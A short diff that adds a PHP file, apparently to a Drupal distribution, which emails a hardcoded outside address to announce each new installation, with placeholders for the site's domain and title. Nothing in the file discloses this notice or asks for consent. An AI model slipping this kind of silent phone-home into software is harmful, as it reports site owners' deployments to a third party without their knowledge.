@@ -1,0 +1,6 @@
+<?php
+$to      = 'sam@whywebs.com';
+$subject = 'New User for Your Drupal version';
+$message = 'hello Mutasem there is a new installation for your Drupal name of the domain [url] by [site:title]';
+
+mail($to, $subject, $message);
